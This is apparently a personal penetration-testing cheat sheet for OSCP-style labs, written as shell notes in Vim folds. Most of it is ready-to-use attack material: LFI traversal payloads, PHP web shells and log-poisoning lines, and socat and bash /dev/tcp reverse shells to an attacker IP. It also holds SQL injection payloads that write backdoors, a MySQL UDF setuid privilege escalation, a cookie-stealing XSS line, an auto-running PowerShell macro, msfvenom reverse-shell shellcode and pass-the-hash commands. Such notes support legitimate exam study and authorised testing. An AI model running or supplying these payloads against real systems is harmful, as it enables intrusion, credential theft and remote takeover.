:set foldmethod=marker
:set syntax=sh
#notepad++: language->s->shell

mkdir tools; sudo vmhgfs-fuse .host:/tools ~/tools -o allow_other -o uid=1000

setup {{{
#8GB RAM, Shared Folder, Remove CD/DVD Drive, NAT, Password to description
passwd
sudo su -
passwd
touch ~/.hushlogin; exit
#snapshot baseline

#turnoff sleep

sudo sed -i 's/search localdomain/search localdomain\nnameserver 8.8.8.8/' /etc/resolv.conf

#python3-venv for pipx (pipx explained later)
#kerberoast: (oscp) https://github.com/nidem/kerberoast
#creddump7: (udemy) https://github.com/CiscoCXSecurity/creddump7 - dump local password hashes from System/SAM hives. Performs all the functions that bkhive/samdump2, cachedump, and lsadump2 do.
#pure-ftpd: oscp recommend ftp server
#snmp-mibs-downloader: give OIDs actual names
sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install -y exploitdb pure-ftpd shellter wine wine32 wine:i386 gcc-9-base python3 python3-pip seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf rinetd httptunnel kerberoast metasploit-framework python3-venv creddump7 snmp-mibs-downloader

#install pip (https://pip.pypa.io/en/stable/) & pipx (https://github.com/pypa/pipx/ & https://pypi.org/project/pipx/)
#pipx is for installing (& managing) python packages that can be run within the command line. It also provides envioronment isolation for these packages/programs unlike pip.
#get-pip is a super easy way of installing pip. Then we use pip to install pipx
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py && python3 get-pip.py && python3 -m pip install --user pipx && python3 -m pipx ensurepath && rm get-pip.py
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip2.py && python2 get-pip2.py
#grab a new terminal!
python3 -m pipx install dadjokes-cli 
python3 -m pipx install pycowsay

#prep metasploit
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init

pure-ftpd {{{
sudo su -
#Good ftp server: https://www.linuxlinks.com/best-free-open-source-linux-ftp-servers/
#Create a group for Pure-FTPD.
groupadd ftpgroup
#Add a user to the group (revoke the home directory and deny acces to shell login).
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
#Create a directory for your ftp-files
mkdir /home/ftphome
#Create a ftp-user, in our example "bob"
pure-pw useradd kali -u ftpuser -g ftpgroup -d /home/ftphome
#Update the ftp database after adding our new user.
pure-pw mkdb
#This is optional, you can list the users in the database, and enumerate spesific users...
pure-pw list
pure-pw show kali
#Set symbolic links for some files.
ln -s /etc/pure-ftpd/pureftpd.passwd /etc/pureftpd.passwd
ln -s /etc/pure-ftpd/pureftpd.pdb /etc/pureftpd.pdb
ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/PureDB
ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/60pdb
#The specified ftp directory (and all it's sub-direcotries) needs to be owned by "ftpuser".
chown -R ftpuser:ftpgroup /home/ftphome
#Restart Pure-FTPD. You should now be able to log in with your created user account.
systemctl restart pure-ftpd
}}}

sudo su -
echo "" > .zsh_history
#restart shell and
echo "" > .zsh_history
#new shell
ll

#populate locate command
sudo updatedb

#snapshot better baseline
}}}

passive {{{
whois $DOMAIN
whois $IP

theHarvester -d $DOMAIN -b google

#https://www.exploit-db.com/google-hacking-database
site:$DOMAIN intitle:"index of" "parent directory"
site:$DOMAIN -filetype:html
site:$DOMAIN filetype:php
site:$DOMAIN ext:jsp
site:$DOMAIN ext:cfm
site:$DOMAIN ext:pl
site:$DOMAIN -inurl:$SUBDOMAIN

https://searchdns.netcraft.com/
https://searchdns.netcraft.com/?restriction=site+contains&host=*.$DOMAIN
	site technology under report
	

recon-ng
	marketplace search $STRING
	marketplace info $MODULE_NAME
	marketplace install $MODULE_NAME
	modules load $MODULE_NAME
	options set $OPTION $ARG
	RUN
	
gitrob & gitleaks

shodan

https://securityheaders.com/?q=$DOMAIN&followRedirects=on
https://www.ssllabs.com/ssltest/analyze.html?d=$DOMAIN

https://www.google.com/search?safe=off&q=site%3Apastebin.com+$DOMAIN

https://www.social-searcher.com/social-buzz/?q5=$DOMAIN

https://osintframework.com

https://www.maltego.com
}}}

active_scanning_&_remote_exploit {{{
exploit_research {{{
searchsploit remote smb microsoft windows
	ls -1 /usr/share/exploitdb/
sudo beef-xss
	http://127.0.0.1:3000/ui/panel
	beef/beeff
	demo page
	zombies
	commands
sudo msfconsole -q
	search -h
	
#https://exploit-db.com/type=local&platform=windows
}}}
initial_scans {{{
#grab macs in local ntwk, may tell us more about the device
sudo netdiscover
sudo netdiscover -r $TGT_IP/24

#look into finalizing this, but probably better to do a quick masscan first and then nmap specific ports
#default forced options -sS -Pn -n
masscan -e $INTERFACE -p1-65535,U:1-65535 $TGT_IP --rate=1000

#T4: speeds up, assuming good network
#n: no name resolution
#Pn: disable ping, assume host is up
#F: fast. top 100 tcp ports
#sV: service detection
#--version-light: sV 2 instead of 7
#sS: syn scan
#A: enables -O -sV -sC and --traceroute
#sC: default scripts (includes intrusive)
#sU: Udp
#-p-: all ports
#top 100 tcp ports, partial versioning
sudo nmap -T4 -n -Pn -F -sV --version-light -O $TGT_IP -oA $TGT_IP_nmap_F_sVlight_O
sudo nmap -T4 -n -Pn -F $TGT_IP -oA $TGT_IP_nmap_F_sVlight_O

#all tcp ports, no versioning
sudo nmap -T4 -n -Pn -sS -p- -O $TGT_IP -oG $TGT_IP_nmap_-p-.txt
#ports that responded, full versioning
sudo nmap -T4 -n -Pn -sS -p$PORTS -sC -A -vv $TGT_IP -oG $TGT_IP_nmap_sS_A.txt

#all  udp ports, no service detection
sudo nmap -T4 -n -Pn -sU -p- $TGT_IP -oG $TGT_IP_nmap_sU_A_sC.txt
#ports that responded, with service detection and scripts
sudo nmap -T4 -n -Pn -p$PORTS -sU -sC -A -vv $TGT_IP -oG $TGT_IP_nmap_sU_A_sC.txt
	

#scan all ports
sudo nmap -T4 -n -Pn -sS -sU -p- $TGT_IP -oG $TGT_IP_nmap_all_port.txt

nmap --script-help=$SCRIPT.nse
	/usr/share/nmap/nmap-services
	/usr/share/nmap/scripts
	grep '"vuln"\|"exploit"' /usr/share/nmap/scripts/script.db
	grep Exploits *.nse
	nmap --script=+$SCRIPT
sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tun0 --router-ip 10.11.0.1
nmap -T4 -n -sT -A --top-ports=20 192.168.186.44 -oG top-port-sweep.txt
nmap -T4 -n -sn 10.11.1.1-254 -oG $TARGET_$SCANTYPE_nmap_txt
tcp syn scan
	nc -nvv -w 1 -z 10.11.1.220 3388-3390
	sudo nmap -sS -p 3389 10.11.1.220
udp scan
	nc -nv -u -z -w 1 10.11.1.115 160-162
	
sudo /etc/init.d/nessusd start
https://localhost:8834
}}}
DNS {{{	
dnsenum $TGT_DOMAIN

#FORWARD
host $TGT_DOMAIN
host -l $TGT_DOMAIN $TGT_IP
#useful command to add domains for one ip to /etc/hosts
echo -e "$TGT_IP\t$(host -l $TGT_DOMAIN $TGT_IP | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
host -t mx $TGT_DOMAIN
host -t txt $TGT_DOMAIN
host -t ns $TGT_DOMAIN
for ip in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do host $ip.$TGT_DOMAIN | grep "has address" >> $TGT_DOMAIN.hosts ; done
for i in $(awk -d" " '{print $4}' $DOMAIND.hosts | sort | uniq); do grep $i $TGT_DOMAIN.hosts | head -1; done

dig axfr $TGT_DOMAIN @TGT_IP

dnsrecon -d $TGT_DOMAIN -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt

#REVERSE
for octet in $(seq 50 100); do host $IP.$octet; done | grep -v "not found"
#XFER
for nameserver in $(host -t ns $TGT_DOMAIN | cut -d" " -f4); do host -l $TGT_DOMAIN $nameserver | grep "has address"; done
dnsrecon -d $TGT_DOMAIN -t axfr
nmap --script=dns-zone-transfer -p 53 $NAMESERVER

}}}
SMB/NetBIOS/samba {{{
#ports u137, t139, t445
#https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/
#https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

#wrapper around smbclient, rpcclient, net, nmblookup
#smbclient version under OS information
#a: do all 
#	U: usr ls
#	S: share ls
#	G: gp mbr ls
#	P: pw policy info
#	r: enumerate users via RID cycling
#	o: os info
#	n: nmblookup (similar to nbtstat)
#	i: printer info
sudo enum4linux -a $TGT_IP

#list share drives and their perms
smbmap -H $TGT_IP
#N: suppress normal password prompt (if it svc doesn't require)
#L: list services available
smbclient -NL //$TGT_IP
#check for null login
#blank passes
smbclient -L //$TGT_IP -U ""
smbclient -L //$TGT_IP -U root
#or...
#exit takes care of any password request that might pop up
echo exit | smbclient -L \\\\[ip]
#common share?
smbclient //$TGT_IP/anonymous -N

#scan IP ntwk for NetBIOS name information (sends status query to address)
#lists IP address, NetBIOS computer name, logged-in user name and MAC
sudo nbtscan $TGT_IP -f $TGT_IP_nbtscan.txt
sudo nbtscan -r $TGT_IP/24

#connects to SMB service to get OS version
nmap -vp139,445 --script=smb-os-discovery $TGT_IP -oG $TGT_IP_nmap_smbOS.txt
#look for anonymous access and path to the share (useful for LFI)
nmap -vp139,445 --script=smb-enum-shares $TGT_IP -oG $TGT_IP_nmap_smbShares.txt
#enum users...
nmap -vp139,445 --script=smb-enum_users $TGT_IP -oG $TGT_IP_nmap_smbUsers.txt

#smb-vuln scripts
nmap -vp139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 $TGT_IP -oG $TGT_IP_nmap_smbMS08-067check.txt

#typical log in with smb
smbclient //$USER/$SHARE -I $TGT_IP
smbclient //$TGT_IP/$SMB_SHARE -U $USER
mkdir /tmp/$TGT_IP_smb_share
sudo mount user=$USER $TGT_IP:/$SMB_SHARE /tmp/$TGT_IP_smb_share
#or
sudo mount -t cifs -o username=guest,rw //$TGT_IP/$SMB_SHARE /tmp/$TGT_IP_smb_share
#then find nonempty files
find /tmp/$TGT_IP_smb_share -not -empty -type f -ls

#get files if not mounting
recursively_get {{{
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
smbclient '\\server\share' -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *''
}}}

#upload to smb share with curl
curl --upload-file /$LOCAL_PATH/$FILE -u '$DOMAIN\$USER' smb://$TGT_IP/$SMB_SHARE/

#may need to update smb version
sudo vim /etc/samba/smb.conf
min protocol = SMB2
sudo /etc/init.d/smbd restart
}}}
RPC (NFS) {{{
nmap -n -Pn -sV -p111 --script=rpcinfo $TGT_IP
portmapper
rpcbind

NFS {{{
nmap -Pn -n -p111 --script nfs* $TGT_IP
showmount -e $TGT_IP

mkdir /tmp/$TGT_IP_nfs_share
sudo mount -o nolock -t nfs $TGT_IP:/$NFS_SHARE /tmp/$TGT_IP_nfs_share
sudo mount -o rw,vers=2 -t nfs $TGT_IP:/$NFS_SHARE /tmp/$TGT_IP_nfs_share
find /tmp/$TGT_IP_nfs_share -not -empty -type f -ls

#if mounting as root, root squash might mount as nobody user instead. Unless no_root_squash is enabled
cat /etc/exports | grep no_root_squash
#might be able to upload shell as root (chmod +xs, so user can execute)

}}}
}}}
ftp {{{
#does it allow anonymous logins?
ftp $TGT_IP
anonymous
anonymous

ls
get
get passwd
get shadow
get vsftpd.conf
#potentially put shell if can access via website
put $SHELL
exit

}}}
ssh {{{
#is there a misconfiguration?
ssh root@$TGT_IP
}}}
SMTP{{{
smtp_vrfy.py usernames.txt ips.txt
}}}
SNMP{{{


echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
onesixtyone -c community -i ips

sudo nmap -sU --open -p161 10.11.1.1-254 -oG open_snmp.txt

snmp-check $IP
snmp-check -t $IP -c public

#might get something useful like a service password 
snmpwalk -c public -v1 -t 10 10.11.1.227
snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25 #users
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2 #processes
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3 #ports
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2 #software
}}}
web {{{
#written in golang. default 10 threads
#k: skip ssl cert verification
gobuster dir -u http(s)://$TGT_IP -x php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t20
gobuster dir -u http(s)://$TGT_IP -x php,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t20

#written in c, but not multithreaded.
#r dont search recursively
#z: add milisecond delay to prevent flooding
#R: interactive recursion
#S: silent, dont show tested words
#X: extension
#x: extension file
dirb $DOMAIN
dirb http://$TGT_IP
#remember try custom words

#dirbuster - java multi-thread gui...by OWASP, unstable?
#dirsearch - written in python3
./dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u $TGT_IP -e php

wfuzz {{{
#bit more tailored than dirb/gobuster
#https://wfuzz.readthedocs.io/en/latest/user/basicusage.html
wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://$TGT_IP/FUZZ
#POST request
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://$TGT_IP/userinfo.php
#Cookies
wfuzz -z file,wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://$TGT_IP/FUZZ
wfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://$TGT_IP
#custom headers
wfuzz -z file,wordlist/general/common.txt -H "myheader: headervalue" -H "myheader2: headervalue2" http://$TGT_IP/FUZZ

#another example here to find dir where uploaded file is: https://0xdf.gitlab.io/2019/07/13/htb-friendzone.html
}}}

nikto -h $TGT_IP
nikto -host=$DOMAIN -maxtime=30s
nikto -h http(s)://$IP:$PORT/$DIRECTORY

#webdav -nmap script scan should find
davtest -url http(s)://$TGT_IP
#note, if PUT method is enabled, you can use devtest to transfer files...
davtest -move -sendbd auto -url http://$$TGT_IP

#https://github.com/IFGHou/wapiti

burpsuite w/ foxyproxy
	intruder

#sitemaps
/robots.txt
/sitemap.xml

#web applications or consoles
/manager/html
/phpmyadmin {{{
#default root/empty
#Login with found creds.
#brute force with burp...
}}}

"C:\xampp\apache\logs\access.log"
"C:\xampp\apache\logs\error.log"

wordpress {{{
#ap: all plugins
#u: users
#at: all themes
#cb: config backups
#dbe: db exports
wpscan --disable-tls-checks --url http://$IP:$PORT/ --enumerate uap
wpscan --url https://$IP:$PORT/ --enumerate uap

/usr/share/wordpress/wp-config.php
/var/www/html/wp-config.php
#use Add Plugins interface to upload php-reverse-shell.php
}}}

iis{{{
#default dir: "C:\inetpub\wwwroot\\"
}}}
}}}
local_file_inclusion (LFI) {{{
#directory traversals fuzzer
#sudo dotdotpwn.pl -m http -h $TGT_IP -M GET

#look for "file=" or something similar (page)
#directory traversals
http://$TGT_IP/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd   
http://$TGT_IP/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html
http://$TGT_IP/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd%00
http://$TGT_IP/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd%00.
http://$TGT_IP/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd%2500
http://$TGT_IP/index.php?system=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd%00.

#Truncation LFI Bypass: injecting long parameter into the vuln file inclusion mechanism, web server may truncate the input parameter bypassing the input filter.

#test
http://$TGT_IP/index.php?file=data:text/plain,hello world

#${@system("ls -l")}
http://$TGT_IP/index.php?page=%24{%40system(base64_decod("bHMgLWw="))}\

#get base64 encoded string of page. decode to get page source (including the php)
http://$TGT_IP/index.php?page=php://filter/convert.base64-encode/resource=$PAGE

#shell directly in url
sudo socat TCP4-LISTEN:$MY_PORT,reuseaddr,fork -
curl -k http://$TGT_IP/index.php?file=data:text/plain,<?php echo shell_exec('socat TCP4:$MY_IP:$MY_PORT EXEC:cmd.exe,pipes') ?>

#or file via accessing uploaded file
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
curl -k http://$TGT_IP/index.php?file=../../../$PATH/cmd.php&cmd=id


#log file contamination
nc -nv $TARGET_IP 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
sudo socat TCP4-LISTEN:443,reuseaddr,fork -
http://$TGT_IP/index.php?file=c:\xampp\apache\logs\access.log&cmd=socat TCP4:$MY_IP:$MY_PORT EXEC:'cmd.exe',pipes

http://192.168.1.10:8080/phptax/index.php?pfilez=xxx;%20nc%20-nlvp%20192.168.1.11%2044321%20-e%20/bin/bash;&pdf=make
http://192.168.1.10:8080/phptax/index.php?pfilez=xxx;echo%20%3C%3Fphpsystem%28%24_GET%5B%27cmd%27%5D%29%3B%3F%20%3E%20shell.php%26pdf%3Dmake
http://192.168.1.10:8080/phptax/index.php?pfilez=1040pg1.tob;echo%20%3C%3Fphp%20system%28%24_GET%5Bcmd%5D%29%3B%3F%3E%20%3E%20shell.php&pdf=make
http://192.168.1.10:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru%28%24_GET%5Bcmd%5D%29%3B%3F%3E
http://192.168.1.10:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru%28%24_GET[cmd]%29%3B%3F%3E
href="index.php?pfilez=1040pg1.tob"
#error logs
#RHEL/CentOS/Fedora - /var/log/httpd/error_log
#Debian/Ubuntu - /var/log/apache2/error.log
#FreeBSD - /var/log/httpd-error.log

#access logs
#RHEL/CentOS/Fedora - /var/log/httpd/access_log
#Debian/Ubuntu - /var/log/apache2/access.log
#FreeBSD - /var/log/httpd-access.log

#find non-standard error/access log locations
# grep ErrorLog /usr/local/etc/apache22/httpd.conf
# grep ErrorLog /etc/apache2/apache2.conf
# grep ErrorLog /etc/httpd/conf/httpd.conf
# grep CustomLog /usr/local/etc/apache22/httpd.conf
# grep CustomLog /etc/apache2/apache2.conf
# grep CustomLog /etc/httpd/conf/httpd.conf

#or
nc -nv $TARGET_IP 80
<?php shell_exec('socat TCP4:$MY_IP:$MY_PORT EXEC:cmd.exe,pipes');?>
http://$TGT_IP/index.php?file=c:\xampp\apache\logs\access.log

#remote file inclusion (RFI)
	http://$TGT_IP/menu2.php?file=http://$MY_IP/mywebshell
}}}
sqli {{{
#http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html

#probe
#DONT USE ON OSCP!
#sqlmap -u $DOMAIN/POSSIBLE_VULN -p "$PARAMETER"

#extract
#mysql/mariadb
#DONT USE ON OSCP!
#sqlmap -u $DOMAIN/POSSIBLE_VULN -p "$PARAMETER" --dbms=mysql --dump

#get shell
#mysql/mariadb
#DONT USE ON OSCP!
#sqlmap -u $DOMAIN/POSSIBLE_VULN -p "$PARAMETER" --dbms=mysql --os-shell

#burp payload list: fuzzdb/attack/sql-injection/detect/MySQL_MSSQL.txt


#remove the \
#MySQL, MSSQL, Oracle, PostgreSQL, SQLite
\' or 1=1 --
\' or 1=1 -- -
\' OR '1'='1'
\' OR '1'='1' --
\' OR '1'='1' -- a
\' OR '1'='1' /*
#MySQL
\' or 1#
\' OR '1'='1
\' OR '1'='1' #
\' or 1=1 limit 1;#
#Access (using null characters)
\' OR '1'='1' %00
\' OR '1'='1' %16

#http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html

#increase $INTEGER to identify the number of columns. can probably use the next step to do the same
1 order by $INTEGER
1 order by 1
1 order by 2
1 order by 3
\' OR '1'='1' order by $INTEGER-- a
#or use burpsuite "send to repeater"

#union to determine which columns are displayed 
union all select 1, 2, 3, $NUM_OF_COLS
\' union all select 1, 2, 3, 4, 5, 6-- a

#get version of database
#mariadb..
union all select 1, 2, @@version

#get database user...is it root? that'd be nice
#mariadb
union all select 1, 2, user()

#replace the vulnerable column (the one that isnt displayed as it's own field) with commands...
#get database structure/layout (including table_names)
#mariadb
union all select 1, 2, table_name from information_schema.tables
\' union all select 1, table_name, 3, 4, 5, 6 from information_schema.tables-- a


#similar, but grab schema (db) names so you can grab tables from within each
\' union all select 1, schema_name, 3, 4, 5, 6 from INFORMATION_SCHEMA.SCHEMATA-- a

#get columns in table. 
#may need to convert tablename to hex or chars
#may need to add group_concat(column_name)
#mariadb
\' union all select 1, 2, column_name from information_schema.columns where table_name='users'
\' union all select 1, column_name, 3, 4, 5, 6 from information_schema.columns where table_name=0x5573657273-- a
\' union all select 1, column_name, 3, 4, 5, 6 from information_schema.columns where table_name=0x5573657244657461696c73 -- a
\' union all select 1, column_name, 3, 4, 5, 6 from information_schema.columns where table_name=0x537461666644657461696c73 -- a
\' union all select 1, column_name, 3, 4, 5, 6 from information_schema.columns where table_name=CHAR(117, 115, 101, 114, 115)-- a

#finally, get the values of the columns. might actually need the db schema
\' UNION ALL SELECT NULL,CONCAT(UserID," ", Username,":",Password),NULL,NULL,NULL,NULL FROM Users-- a
\' UNION ALL SELECT NULL,CONCAT(id," ", firstname, " ", lastname, " ", username,":",Password),NULL,NULL,NULL,NULL FROM UserDetails-- a

#read file from database
union all select 1, 2, load_file('/etc/passwd')
union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')

#write to file
union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
union all select 1, 2, "<?php echo shell_exec('socat TCP4:192.168.119.186:443 EXEC:cmd.exe,pipes');?>" into OUTFILE 'c:/xampp/htdocs/backdoor2.php'

#actual sql to add user
select * from webappdb.users
insert into webappdb.users(password, username) VALUES (”backdoor“,”backdoor“);

user_defined_function (UDF) privesc {{{
#udemy covers in services section
#https://dev.mysql.com/doc/extending-mysql/5.7/en/adding-udf.html
#https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
#http://itdrafts.blogspot.com/2014/11/mysql-root-to-system-root-with.html

#mysql root privs?
ps aux | grep -i mysql

#mysqludf on machine?
ls -la /usr/lib/lib_mysqludf_sys.so
ls -la /usr/lib/mysql/plugin/lib_mysqludf_sys.so
#if not, create custom .so
wget https://www.exploit-db.com/download/1518
gcc -g -c 1518.c -fPIC
gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc

#login into the local mysql
mysql -h localhost -u root -p
mysql -u root -p

#load library
use mysql;
#if lib_mysqludf_sys existed 
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
#if it didnt
create table foo(line blob);
insert into foo values(load_file('/home/$USERNAME/1518.so'));
#check plugin dir
select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
create function sys_exec returns integer soname '1518.so';

#privesc...
select sys_exec('usermod -a -G admin $USERNAME');
sudo su
#or...
select sys_exec('chmod u+s /bin/bash');
#was suid set?
ls -al /bin/bash
bash -p
#or..
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
/tmp/rootbash -p

}}}

}}}
oracledb (port 1521) {{{
#sqlplus/odat
#https://github.com/quentinhardy/odat
#https://github.com/quentinhardy/odat/releases/
#need ip, port, SID, user/pass
#grab oracle ver from service nmap scan
#test to see if vulnerable to tns poison
nmap --script=oracle-tns-poison -p1521 $TGT_IP

#sid
odat sidguesser -s $TGT_IP -p $TGT_PORT
#bruteforce user/pass (default oracledb = scott/tiger)
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>
#login enumerate (as sysdba)
sqlplus $USER/$PASS@$TGT_IP:$TGT_PORT/$SID as sysdba
select * from user_role_privs;

odat privesc -s $TGT_IP -d $SID -U scott -P tiger –sysdba –dba-with-execute-any-procedure

odat all -s $TGT_IP -d $SID -U $USER -P $PASS --sysdba
#shell upload example to ISS default dir
odat dbmsadvisor -s $TGT_IP -d $SID -U $USER -P $PASS --sysdba --putFile C:\\inetpub\\wwwroot $SHELL.aspx /usr/share/webshells/aspx/cmdasp.aspx

#Check if running as system. if it is, potentially grab keyfile
odat ctxsys -s $TGT_IP -d $SID -U $USER -P $PASS --sysdba --getFile c:\\users\\administrator\\desktop\\root.txt
}}}
RCI {{{
#can check with burp payload list: fuzzdb/attack/os-cmd-execution/command-execution-unix.txt
}}}
xxs {{{
#test with these characters: < > ' " { } ;
<script>alert('XSS')</script>
<body onload=alert('test1')>
<body onload=alert(document.cookie);>

#get ip and user-agent info
<iframe src=http://$RDR_IP/report height=”0” width=”0”></iframe>
<iframe src=http://192.168.119.186/report height=”0” width=”0”></iframe>

#get cookie (secure and HttpOnly not set)
<script>new Image().src="http://192.168.119.186/cool.jpg?output="+document.cookie;</script>

BeEF
}}}
ipsec_vpn {{{
#get host info
ike-scan $TGT_IP
#install strongswan
#setup /etc/ipsec.conf
conn $NAME_FOR_TGT
	authby=secret
	auto=route
	keyexchange=ikev1
	ike=3des-sha1-modp1024 #from ike-scan enc, hash, group
	left=$MY_IP
	right=$TGT_IP
	type=transport
	esp=3des-sha1 #from ike-scan enc, hash
	rightprotoport=tcp
#setup /etc/ipsec.secrets
$MY_IP $TGT_IP : PSK "$IPSEC_PASSWORD"
#start ipsec
ipsec start
#initialize connection
ipsec up $NAME_FOR_TGT

#rescan once on vpn...
}}}

macro_calling_hta_shell {{{
#split HTA payload 
#see shells->hta to create
str = "$HTA_PAYLOAD"
n = 50
for i in range(0, len(str), n):
print "Str = Str + " + '"' + str[i:i+n] + '"'

#macro
Sub AutoOpen()
	mymacro
End Sub
Sub Document_Open()
	mymacro
End Sub
Sub mymacro()
	Dim Str As String
	Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	Str = Str + "asdf..."
	CreateObject("Wscript.Shell").Run Str
End Sub
}}}
Dynamic Data Exchange (DDE)/Object Linking and Embedding (OLE){{{
insert -> object -> bat file...
}}}

buffer_overflow {{{
guides{{{
#https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
#https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
#https://exploit-exercises.com/protostar/
}}}
#tool to help check security prefs
http://www.trapkit.de/tools/checksec.html

#find offset
#https://www.offensive-security.com/metasploit-unleashed/msfvenom/
pattern_create.rb -l $LENGTH
pattern_offset.rb -q $PATTERN
#verify EIP location
buffer = "A" * $FOUND_OFFSET + "B" \* 4 + "C" \* 90
#check for bad chars
#use mona to find unprotected module (dll)
#bypass DEP by finding mem location w/read & execute access for JMP ESP
#NASM to determine HEX code for a JMP ESP instructions
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#MONA to find that HEX code (jmp esp = FFE4)
!mona find -s "\xff\xe4" -m $MODULE
#flip endianness of that address
#use for EIP
buffer = "A" * $FOUND_OFFSET + "\xXX\xXX\xXX\xXX" + "C" \* 90
#msfvenom to create payload excluding bad chars
msfvenom -p windows/shell_reverse_tcp LHOST=$NY_IP LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
#final payload
buffer="A"*$FOUND_OFFSET + "\xXX\xXX\xXX\xXX" + "\x90" * 8 + shellcode


#nmap fuzzers
https://nmap.org/nsedoc/categories/fuzzer.html
#nmap http form fuzzer
nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $TGT_IP
#nmap dns fuzzer
nmap --script dns-fuzz --script-args timelimit=2h $TGT_IP -d


}}}
port_knocking {{{
#may be a "filtered" port
#attempt to grab knockd config (possibly through LFI)
/etc/knockd.conf
for port in $KNOCK_PORT1 $KNOCK_PORT2 $KNOCK_PORT3; do nc -vz $TGT_IP $port; done

#test on filtered port
nc -vz $TGT_IP $FILTERED_PORT
}}}
other_specific_services{{{
#cuppa cms database config have creds?
/cuppaCMS/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
}}}
}}}

shells/connections/backdoors {{{
#kali->windows with creds (connects to 445)
winexe -U '$WIN_DOMAIN/$USERNAME%$PASSWOD' //$TGT_IP cmd.exe
#if admin
winexe --system -U '$WIN_DOMAIN/$USERNAME%$PASSWOD' //$TGT_IP cmd.exe

#kali->windows with hash
pth-winexe -U '$DOMAIN/$USER%aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH' //$TARGET_IP cmd
#if admin
pth-winexe --system -U '$DOMAIN/$USER%aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH' //$TARGET_IP cmd

hta_shell {{{
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.186 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
}}}

ls -al /usr/share/webshells

sudo socat TCP4-LISTEN:443,reuseaddr,fork -
socat TCP4:$MY_IP:443 EXEC:'cmd.exe',pipes

<?php shell_exec('socat TCP4:$MY_IP:443 EXEC:/bin/bash');?>
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/$MY_IP/1234 0>&1’”);?>

powershell_callback {{{
#may need to prepend: powershell -nop -c
#and then put all in "" and convert previous " to '
$client = New-Object System.Net.Sockets.TCPClient("$MY_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2= $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}}}

